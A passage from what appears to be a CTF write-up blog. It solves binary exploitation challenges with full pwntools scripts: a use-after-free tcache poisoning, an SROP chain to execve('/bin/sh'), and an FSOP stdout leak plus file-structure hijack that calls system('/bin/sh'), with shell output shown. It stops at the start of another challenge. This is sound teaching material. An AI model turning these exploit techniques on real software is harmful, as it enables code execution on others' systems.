<span class="hljs-keyword">def</span> <span class="hljs-title function_">sanity</span>():
    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)

alloc(<span class="hljs-number">0</span>)
alloc(<span class="hljs-number">1</span>)
</code></pre>
<p>Free the both of them:</p>
<pre class="hljs"><code>free(<span class="hljs-number">1</span>)
free(<span class="hljs-number">0</span>)
</code></pre>
<p>Abuse our UAF to write a forged <code>*next</code> pointer to chunk <code>0</code>:</p>
<pre class="hljs"><code>write(<span class="hljs-number">0</span>, pack((chunks[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">12</span>) ^ <span class="hljs-number">0x404030</span>)) <span class="hljs-comment"># pigs_flying: 0x404030</span>
</code></pre>
<p>And thus allocate twice again to obtain an allocated chunk at <code>pigs_flying</code>:</p>
<pre class="hljs"><code>alloc(<span class="hljs-number">0</span>)
alloc(<span class="hljs-number">0</span>) <span class="hljs-comment"># pigs_flying</span>
</code></pre>
<p>We can then write our <code>\x01</code> to the chunk and trigger the sanity check to get our flag.</p>
<h3 id="full-solve-script-4"tabindex="-1">Full solve script</h3>
<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>

<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

elf = ELF(<span class="hljs-string">&quot;./chal_patched&quot;</span>)
libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)
ld = ELF(<span class="hljs-string">&quot;./ld-linux-x86-64.so.2&quot;</span>)

context.binary = elf
context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
context.terminal = <span class="hljs-string">&#x27;kitty&#x27;</span>

<span class="hljs-comment"># p = process()</span>
<span class="hljs-comment"># gdb.attach(p)</span>
p = remote(<span class="hljs-string">&#x27;chal2.sieberr.live&#x27;</span>, <span class="hljs-number">15004</span>)

chunks = [<span class="hljs-number">0</span>] * <span class="hljs-number">16</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">idx</span>):
    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())
    p.recvuntil(<span class="hljs-string">b&#x27;drips: &#x27;</span>)
    chunks[idx] = <span class="hljs-built_in">int</span>(p.recvline().strip(), <span class="hljs-number">16</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):
    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())

<span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">idx, content</span>):
    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())
    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, content)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">sanity</span>():
    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)

alloc(<span class="hljs-number">0</span>)
alloc(<span class="hljs-number">1</span>)
free(<span class="hljs-number">1</span>)
free(<span class="hljs-number">0</span>)
write(<span class="hljs-number">0</span>, pack((chunks[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">12</span>) ^ <span class="hljs-number">0x404030</span>))
alloc(<span class="hljs-number">0</span>)
alloc(<span class="hljs-number">0</span>)
write(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;\x01&#x27;</span>)
sanity()

p.interactive()
</code></pre>
<h2 id="sieberrop"tabindex="-1">Sieberrop</h2>
<blockquote>
<p><strong>author</strong>: lty748</p>
<p><strong>solves</strong>: 1</p>
</blockquote>
<p>I did not manage to solve this within the duration of the qualifiers CTF. ~im so mad though because i tried it on the train and solved it within 4 minutes~</p>
<h3 id="challenge-protections-5"tabindex="-1">Challenge Protections</h3>
<pre class="hljs"><code>[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/sieberrop/vuln'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
</code></pre>
<p>The challenge is a barebones <code>nasm</code> binary written without linking libc.</p>
<pre class="hljs"><code>global _start

section .text
_start:
    ; Reserve 0x100 bytes on the stack for local buffer
    enter 0x100, 0x0

    ; Call the timer function to set an alarm
    call set_alarm

    ; Syscall: write(stdout, msg, msg_len)
    mov rax, 0x1          ; syscall number for write
    mov rdi, rax          ; file descriptor 1 (stdout)
    lea rsi, [rel msg]    ; pointer to message
    mov edx, msg_len      ; message length
    syscall

    ; Syscall: read(stdin, rsp, 0x1000)
    xor eax, eax          ; syscall number 0 (read)
    xor edi, edi          ; file descriptor 0 (stdin)
    mov rsi, rsp          ; buffer on stack
    mov edx, 0x1000       ; number of bytes to read
    syscall

    leave
    ret

set_alarm:
    ; Syscall: alarm(15)
    mov edi, 15
    mov eax, 37           ; syscall number for alarm
    syscall
    ret

section .data
    msg: db &quot;As a pup, the wolf YEARNED for the /bin/sh&quot;
    msg_len: equ $ - msg
</code></pre>
<p>A string is written to <code>stdout</code> when the program is run, before reading 0x1000 bytes.</p>
<p>This is a Sigreturn Oriented Programming (SROP) problem, as we have no gadgets to control <code>rdi</code>, <code>rsi</code>, or <code>rdx</code> but can control <code>rax</code> through syscalls. There exists a large buffer overflow, which we will use to write an SROP chain.</p>
<h3 id="what-is-srop%3F"tabindex="-1">What is SROP?</h3>
<p>A <strong>sigreturn</strong> is a syscall that is used to return from a <strong>signal handler</strong> and clean up a stack frame after a signal has been unblocked.</p>
<p>When a sigreturn is called, all register values <strong>are stored on the stack</strong>. After the signal is unblocked, all the values are popped back in, with <code>rsp</code> pointing to the bottom of the sigreturn frame (the collection of register values).</p>
<p>Hence, we can use a sigreturn syscall to control <code>rdi</code>, <code>rsi</code>, <code>rdx,</code> and <code>rip</code> and thus get our shell</p>
<h3 id="exploit-1"tabindex="-1">Exploit</h3>
<p>We first need a way to control <code>rax</code> and set it to 15. In <code>set_alarm</code>, <code>alarm(15)</code> is called:</p>
<pre class="hljs"><code>set_alarm:
    ; Syscall: alarm(15)
    mov edi, 15
    mov eax, 37           ; syscall number for alarm
    syscall
    ret

</code></pre>
<p>In the manpage for <code>alarm</code>, we can see that:</p>
<pre class="hljs"><code>alarm(2)                                               System Calls Manual                                              alarm(2)

NAME
       alarm - set an alarm clock for delivery of a signal

LIBRARY
       Standard C library (libc, -lc)

SYNOPSIS
       #include &lt;unistd.h&gt;

       unsigned int alarm(unsigned int seconds);

DESCRIPTION
       alarm() arranges for a SIGALRM signal to be delivered to the calling process in seconds seconds.

       If seconds is zero, any pending alarm is canceled.

       In any event any previously set alarm() is canceled.

RETURN VALUE
       alarm()  returns the number of seconds remaining until any previously scheduled alarm was due to be delivered, or zero if
       there was no previously scheduled alarm.
</code></pre>
<p>Hence, in order to set <code>rax</code> to the syscall number of <code>rt_sigreturn</code>, 15, we can first set two alarms. The first alarm will first set an alarm, and then we can use the second alarm to return the number of seconds remaining until the first alarm was due to be delivered, 15, hence setting <code>rax</code> to 15.</p>
<pre class="hljs"><code>rop = ROP(elf)
rop.raw(<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">264</span>)
rop.set_alarm()
rop.set_alarm()
</code></pre>
<p>We can then call <code>rt_sigreturn</code> with a <code>syscall; ret</code> gadget in the binary:</p>
<pre class="hljs"><code>rop = ROP(elf)
rop.raw(<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">264</span>)
rop.set_alarm()
rop.set_alarm()
rop.raw(rop.find_gadget([<span class="hljs-string">&#x27;syscall&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>])[<span class="hljs-number">0</span>])
</code></pre>
<p>Now, we can forge a fake <code>sigreturn</code> frame as the register values on the stack after our syscall. Fortunately, <code>pwntools</code> has a convenient <code>SigreturnFrame</code> class that helps to automate this process.</p>
<p>Noting that the only string in the binary contains a <code>/bin/sh</code> at 0x402023, we can thus set <code>rdi</code> to that address. We can thus set the other registers accordingly to set up an <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> syscall that will get our shell.</p>
<pre class="hljs"><code>rop = ROP(elf)
rop.raw(<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">264</span>)
rop.set_alarm()
rop.set_alarm()
rop.raw(rop.find_gadget([<span class="hljs-string">&#x27;syscall&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>])[<span class="hljs-number">0</span>])

frame = SigreturnFrame()
frame.rax = <span class="hljs-number">0x3b</span>
frame.rdi = <span class="hljs-number">0x402023</span>
frame.rsi = <span class="hljs-number">0</span>
frame.rdx = <span class="hljs-number">0</span>
frame.rip = rop.find_gadget([<span class="hljs-string">&#x27;syscall&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>])[<span class="hljs-number">0</span>]

rop.raw(<span class="hljs-built_in">bytes</span>(frame))
</code></pre>
<h3 id="full-solve-script-5"tabindex="-1">Full solve script</h3>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

elf = context.binary = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)
context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
context.terminal = <span class="hljs-string">&#x27;kitty&#x27;</span>

p = process()
gdb.attach(p)

rop = ROP(elf)
rop.raw(<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">264</span>)
rop.set_alarm()
rop.set_alarm()
rop.raw(rop.find_gadget([<span class="hljs-string">&#x27;syscall&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>])[<span class="hljs-number">0</span>])

frame = SigreturnFrame()
frame.rax = <span class="hljs-number">0x3b</span>
frame.rdi = <span class="hljs-number">0x402023</span>
frame.rsi = <span class="hljs-number">0</span>
frame.rdx = <span class="hljs-number">0</span>
frame.rip = rop.find_gadget([<span class="hljs-string">&#x27;syscall&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>])[<span class="hljs-number">0</span>]

rop.raw(<span class="hljs-built_in">bytes</span>(frame))

p.send(rop.chain())

p.interactive()
</code></pre>
<h2 id="writer"tabindex="-1">Writer</h2>
<blockquote>
<p>you have so many writes i wouldnt stress about making them count</p>
<p><strong>author</strong>: whywhy</p>
<p><strong>solves</strong>: 0</p>
</blockquote>
<p>I did not manage to solve this within the duration of the qualifiers CTF. Nevertheless, let’s take a look at the challenge.</p>
<h3 id="challenge-protections-6"tabindex="-1">Challenge Protections</h3>
<pre class="hljs"><code>[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/writer/chal_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    Stripped:   No
</code></pre>
<p>The challenge exposes yet another simple interface - in a while loop, a <code>malloc</code> request of 0x100 is made. The user is then asked for an offset, and then allowed to read in 0x100 bytes.</p>
<pre class="hljs"><code><span class="hljs-comment">// gcc -o chal chal.c -fstack-protector-all -Wl,-z,relro,-z,now -fpie -pie</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-type">char</span>** buf_ptr = <span class="hljs-literal">NULL</span>;
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);
  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);
  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {
    <span class="hljs-type">char</span>* buf = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
    buf_ptr = &amp;buf;
    <span class="hljs-type">int</span> off = <span class="hljs-number">0</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;off);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);
    read(<span class="hljs-number">0</span>, *((<span class="hljs-type">char</span>**)((<span class="hljs-type">char</span>*)(&amp;buf_ptr) + off)), <span class="hljs-number">0x100</span>);
  }

  _exit(<span class="hljs-number">1</span>);
}
</code></pre>
<h3 id="vulnerability-2"tabindex="-1">Vulnerability</h3>
<p>There is a weirdly suspicious line in the program source:</p>
<pre class="hljs"><code>    read(<span class="hljs-number">0</span>, *((<span class="hljs-type">char</span>**)((<span class="hljs-type">char</span>*)(&amp;buf_ptr) + off)), <span class="hljs-number">0x100</span>);
</code></pre>
<p>Let’s break it down.</p>
<pre class="hljs"><code>(<span class="hljs-type">char</span> *)(&amp;buf_ptr) + off
</code></pre>
<p>The address of <code>buf_ptr</code> (which lives in the BSS) is first casted as a <code>char *</code> pointer. An offset <code>off</code> is then added to the pointer to form (1).</p>
<pre class="hljs"><code>((<span class="hljs-type">char</span> **)((<span class="hljs-type">char</span> *)(&amp;buf_ptr) + off))
</code></pre>
<p>The pointer from (1) is then recasted as a <code>char **</code> pointer to form (2). The following visualisation might help:</p>
<pre class="hljs"><code>char **bss_ptr (2) -&gt; char *stack pointer -&gt; char heap allocation[0x100]
</code></pre>
<pre class="hljs"><code>*((<span class="hljs-type">char</span> **)((<span class="hljs-type">char</span> *)(&amp;buf_ptr) + off))
</code></pre>
<p>The <code>char **</code> pointer from (2) is then dereferenced to obtain the address that the bss pointer points to. (3)</p>
<pre class="hljs"><code>char **bss_ptr (2) -&gt; char *stack pointer (3) -&gt; char heap allocation[0x100]
</code></pre>
<p>(3) is then passed into <code>read(0, (3), 0x100)</code>.</p>
<p>However, notice that if we pass in an offset to <code>&amp;buf_ptr</code>:</p>
<pre class="hljs"><code>char **(bss_ptr + offset) (2) -&gt; char *different pointer (3)
</code></pre>
<p>Hence, because we can control what offset is passed into (2), we have an arbitrary “dereference-write” primitive, that allows us to write into pointers on the BSS.</p>
<h3 id="write-what-where%3F"tabindex="-1">Write What Where?</h3>
<p>There are not many pointers that live on the BSS or the binary that may be of interest. However, there are a few crucial pointers of interest that we could take advantage:</p>
<pre class="hljs"><code>0x555555558000:	0x0000000000000000	0x0000555555558008
0x555555558010 &lt;stdout@GLIBC_2.2.5&gt;:	0x00007ffff7fb4760	0x0000000000000000
0x555555558020 &lt;stdin@GLIBC_2.2.5&gt;:	0x00007ffff7fb3a80	0x0000000000000000
0x555555558030 &lt;buf_ptr&gt;:	0x00007fffffffd160	0x0000000000000000
</code></pre>
<p>During runtime, the program often exposes pointers to the <code>FILE *stdout</code> and <code>FILE *stdin</code> FILE structures in libc. With our arbitrary deref-write primitive, we are able to write into the <code>stdout</code> and <code>stdin</code> FILE structures, allowing us to perform a File Stream Oriented Programming (FSOP) attack.</p>
<h4 id="file-stream-oriented-programming-(fsop)"tabindex="-1">File Stream Oriented Programming (FSOP)</h4>
<p>FSOP is a complicated and highly detailed exploitation technique that allows threat actors to not only gain arbitrary read and write primitives, but also <a href="https://blog.kylebot.net/2022/10/22/angry-FSROP/">arbitrary code execution</a> through long code paths in libc that eventually propagate our controlled data into $RIP.</p>
<p><code>stdout</code> and <code>stdin</code>, being file streams for input and output, live in LIBC as <code>FILE</code> structs.</p>
<pre class="hljs"><code>/* offset      |    size */  type = struct _IO_FILE {
/* 0x0000      |  0x0004 */    int _flags;
/* XXX  4-byte hole      */
/* 0x0008      |  0x0008 */    char *_IO_read_ptr;
/* 0x0010      |  0x0008 */    char *_IO_read_end;
/* 0x0018      |  0x0008 */    char *_IO_read_base;
/* 0x0020      |  0x0008 */    char *_IO_write_base;
/* 0x0028      |  0x0008 */    char *_IO_write_ptr;
/* 0x0030      |  0x0008 */    char *_IO_write_end;
/* 0x0038      |  0x0008 */    char *_IO_buf_base;
/* 0x0040      |  0x0008 */    char *_IO_buf_end;
/* 0x0048      |  0x0008 */    char *_IO_save_base;
/* 0x0050      |  0x0008 */    char *_IO_backup_base;
/* 0x0058      |  0x0008 */    char *_IO_save_end;
/* 0x0060      |  0x0008 */    struct _IO_marker *_markers;
/* 0x0068      |  0x0008 */    struct _IO_FILE *_chain;
/* 0x0070      |  0x0004 */    int _fileno;
/* 0x0074: 0x0 |  0x0004 */    int _flags2 : 24;
/* 0x0077      |  0x0001 */    char _short_backupbuf[1];
/* 0x0078      |  0x0008 */    __off_t _old_offset;
/* 0x0080      |  0x0002 */    unsigned short _cur_column;
/* 0x0082      |  0x0001 */    signed char _vtable_offset;
/* 0x0083      |  0x0001 */    char _shortbuf[1];
/* XXX  4-byte hole      */
/* 0x0088      |  0x0008 */    _IO_lock_t *_lock;
/* 0x0090      |  0x0008 */    __off64_t _offset;
/* 0x0098      |  0x0008 */    struct _IO_codecvt *_codecvt;
/* 0x00a0      |  0x0008 */    struct _IO_wide_data *_wide_data;
/* 0x00a8      |  0x0008 */    struct _IO_FILE *_freeres_list;
/* 0x00b0      |  0x0008 */    void *_freeres_buf;
/* 0x00b8      |  0x0008 */    struct _IO_FILE **_prevchain;
/* 0x00c0      |  0x0004 */    int _mode;
/* 0x00c4      |  0x0014 */    char _unused2[20];

                               /* total size (bytes):  216 */
                             } 
</code></pre>
<p>By coaxing the values of different fields in the <code>FILE</code> structs, we can get <code>stdout</code> to write out an arbitrary number of bytes from any address range, giving us an info leak primitive, as well as code execution.</p>
<h3 id="info-leak-1"tabindex="-1">Info Leak</h3>
<p>We first need to obtain an info leak that gives us either PIE base or libc base. While traditionally, we <a href="https://docs.pwntools.com/en/stable/filepointer.html">do need to know where we exactly are writing from</a> to gain a fully controlled info leak primitive, nobodyisnobody <a href="https://github.com/nobodyisnobody/docs/blob/main/using.stdout.as.a.read.primitive/README.md">details a leakless leak technique that involves a partial overwrite in the <code>stdout</code> FILE structure</a>.</p>
<pre class="hljs"><code><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">offset, content</span>):
    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(offset).encode())
    p.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, content)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">leak</span>():
    write(-<span class="hljs-number">32</span>, p64(<span class="hljs-number">0xfbad1887</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>))
    <span class="hljs-keyword">return</span> p.recv(<span class="hljs-number">145</span>)

</code></pre>
<p>While we don’t exactly know <strong>where</strong> we are writing from, it is highly likely that our random leak would contain at least one libc pointer that we can use to calculate libc base:</p>
<pre class="hljs"><code>[DEBUG] Sent 0x21 bytes:
    00000000  87 18 ad fb  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000020  00                                                  │·│
    00000021
[*] Switching to interactive mode
[DEBUG] Received 0xe5 bytes:
    00000000  00 00 00 00  00 00 00 00  00 5a ef 93  10 7f 00 00  │····│····│·Z··│····│
    00000010  ff ff ff ff  ff ff ff ff  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000020  80 38 ef 93  10 7f 00 00  00 00 00 00  00 00 00 00  │·8··│····│····│····│
    00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000050  00 00 00 00  00 00 00 00  e0 05 ef 93  10 7f 00 00  │····│····│····│····│
    00000060  87 18 ad fb  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000080  00 47 ef 93  10 7f 00 00  e3 47 ef 93  10 7f 00 00  │·G··│····│·G··│····│
    00000090  e3 47 ef 93  10 7f 00 00  e3 47 ef 93  10 7f 00 00  │·G··│····│·G··│····│
    000000a0  e4 47 ef 93  10 7f 00 00  00 00 00 00  00 00 00 00  │·G··│····│····│····│
    000000b0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    000000c0  00 00 00 00  00 00 00 00  80 3a ef 93  10 7f 00 00  │····│····│·:··│····│
    000000d0  01 00 00 00  00 00 00 00  ff ff ff ff  ff ff ff ff  │····│····│····│····│
    000000e0  00 00 00 3e  20                                     │···&gt;│ │
    000000e5
\x00\x00\x00\x00\x00\x00\x00\x00\x00Z\xef\x93\x10\x7f\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x808\xef\x93\x10\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x05\xef\x93\x10\x7f\x00\x00\x87\x18\xad\xfb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00G\xef\x93\x10\x7f\x00\x00\xe3G\xef\x93\x10\x7f\x00\x00\xe3G\xef\x93\x10\x7f\x00\x00\xe3G\xef\x93\x10\x7f\x00\x00\xe4G\xef\x93\x10\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80:\xef\x93\x10\x7f\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00
</code></pre>
<p>Let’s just receive all of them:</p>
<pre class="hljs"><code><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak</span>():
    write(-<span class="hljs-number">32</span>, p64(<span class="hljs-number">0xfbad1887</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>))
    <span class="hljs-keyword">return</span> p.recv(<span class="hljs-number">145</span>)

write(-<span class="hljs-number">32</span>, p64(<span class="hljs-number">0xfbad1887</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>))
p.interactive()
</code></pre>
<p>Looking at the 8 bytes from index 136 onwards, we can see a <code>\x7f</code> byte, indicating a libc pointer. We can re-run our script while checking in GDB what this pointer is:</p>
<pre class="hljs"><code>gef&gt; x 0x7f28a41857e3
0x7f28a41857e3 &lt;_IO_2_1_stdout_+131&gt;:	0x00000000
</code></pre>
<p>We can then finally calculate our libc base:</p>
<pre class="hljs"><code>write(-<span class="hljs-number">32</span>, p64(<span class="hljs-number">0xfbad1887</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>))
libc.address = u64(leak()[<span class="hljs-number">136</span>:<span class="hljs-number">144</span>]) - libc.sym._IO_2_1_stdout_ - <span class="hljs-number">131</span>
log.info(<span class="hljs-string">&quot;libc.address, %#x&quot;</span>, libc.address)
</code></pre>
<h3 id="code-execution"tabindex="-1">Code Execution</h3>
<p>In order to achieve code execution and get our shell, we can perform FSOP again by writing, yet again, to <code>stdout</code>. In theory, this is possible by exploiting a <a href="https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/">House of Apple</a> which involves code execution through <code>_IO_wfile_overflow</code>, however in practice we do not spend much time crafting a payload manually.</p>
<p><a href="https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/exp_fsop.py">nobodyisnobody</a> details an FSOP chain with a pre-created payload that we can easily paste into our exploit script and modify to our needs:</p>
<pre class="hljs"><code>stdout_lock = libc.address + <span class="hljs-number">0x1d4a10</span> <span class="hljs-comment">#_IO_stdfile_1_lock  (symbol not exported)</span>
stdout = libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]
fake_vtable = libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]-<span class="hljs-number">0x18</span>
<span class="hljs-comment"># our gadget</span>
gadget = libc.address + <span class="hljs-number">0x00000000001405dc</span> <span class="hljs-comment"># add rdi, 0x10 ; jmp rcx</span>

fake = FileStructure(<span class="hljs-number">0</span>)
fake.flags = <span class="hljs-number">0x3b01010101010101</span>
fake._IO_read_end=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]		<span class="hljs-comment"># the function that we will call: system()</span>
fake._IO_save_base = gadget
fake._IO_write_end=u64(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)	<span class="hljs-comment"># will be at rdi+0x10</span>
fake._lock=stdout_lock
fake._codecvt= stdout + <span class="hljs-number">0xb8</span>
fake._wide_data = stdout+<span class="hljs-number">0x200</span>		<span class="hljs-comment"># _wide_data just need to points to empty zone</span>
fake.unknown2=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(stdout+<span class="hljs-number">0x20</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(fake_vtable)

write(-<span class="hljs-number">32</span>, <span class="hljs-built_in">bytes</span>(fake))

p.interactive()
</code></pre>
<p>Writing this to <code>stdout</code> gives us our shell:</p>
<pre class="hljs"><code>[*] libc.address, 0x7f8e22755000
[DEBUG] Sent 0x4 bytes:
    b'-32\n'
[DEBUG] Received 0x2 bytes:
    b'&gt; '
[DEBUG] Sent 0xe8 bytes:
    00000000  01 01 01 01  01 01 01 3b  00 00 00 00  00 00 00 00  │····│···;│····│····│
    00000010  90 14 7a 22  8e 7f 00 00  00 00 00 00  00 00 00 00  │··z&quot;│····│····│····│
    00000020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000030  2f 62 69 6e  2f 73 68 00  00 00 00 00  00 00 00 00  │/bin│/sh·│····│····│
    00000040  00 00 00 00  00 00 00 00  dc 55 89 22  8e 7f 00 00  │····│····│·U·&quot;│····│
    00000050  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000070  00 00 00 00  00 00 00 00  ff ff ff ff  ff ff ff ff  │····│····│····│····│
    00000080  00 00 00 00  00 00 00 00  10 9a 92 22  8e 7f 00 00  │····│····│···&quot;│····│
    00000090  ff ff ff ff  ff ff ff ff  18 88 92 22  8e 7f 00 00  │····│····│···&quot;│····│
    000000a0  60 89 92 22  8e 7f 00 00  00 00 00 00  00 00 00 00  │`··&quot;│····│····│····│
    000000b0  00 00 00 00  00 00 00 00  80 87 92 22  8e 7f 00 00  │····│····│···&quot;│····│
    000000c0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    000000d0  00 00 00 00  00 00 00 00  88 40 92 22  8e 7f 00 00  │····│····│·@·&quot;│····│
    000000e0  00 00 00 00  00 00 00 00                            │····│····│
    000000e8
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x51 bytes:
    b'chal\tchal_patched  ld-linux-x86-64.so.2  solve.py\n'
    b'chal.c\tDockerfile    libc.so.6\n'
chal	chal_patched  ld-linux-x86-64.so.2  solve.py
chal.c	Dockerfile    libc.so.6
$ 
</code></pre>
<h2 id="photoshop"tabindex="-1">Photoshop</h2>
<p>This challenge was the only 1 out of 3 pwn challenges that had solves by the end of the finals, but is also by far one of the most interesting stack challenges I have ever done.</p>
<p>Two solutions so far have been heard, one involving using the gadgets already existing in the <code>icon.png</code> to ROP to a shell, and another one involving using a <code>ret</code> gadget in the <code>icon.png</code> to partial overwrite an address on the stack to return to <code>main</code>, manipulating a byte change feature to gain a <code>read</code> from <code>stdin</code> and thus execute shellcode.</p>
<p>This writeup shows the solution to the latter.</p>
<h3 id="challenge-protections-7"tabindex="-1">Challenge Protections</h3>
<pre class="hljs"><code>[*] '/home/nikolawinata/Documents/ctf/sieberr/finals/photoshop/photoshop'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
    Debuginfo:  Yes
</code></pre>
<p>The binary <code>mmaps</code> a read-write memory region with the constant address 0x10000 and reads a provided <code>icon.png</code> into the region. It allows you to change a single byte in the region, before setting the region to read-execute, and then gives you a buffer overflow of 0x108 - 0x10.</p>
<p>Since the binary is protected with PIE, you are not able to use any gadgets in the binary.</p>
<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>
